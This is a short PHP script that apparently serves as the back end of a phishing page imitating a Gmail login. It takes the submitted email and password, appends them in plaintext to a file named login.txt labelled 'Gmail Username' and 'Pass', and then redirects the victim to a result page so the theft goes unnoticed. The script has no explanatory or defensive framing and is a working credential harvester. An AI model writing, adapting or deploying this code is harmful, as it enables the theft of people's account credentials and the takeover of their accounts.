<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $pass = $_POST['pass'] ?? '';

    $log = "Gmail Username: $email | Pass: $pass\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: ./result.html');
    exit();
}
?>
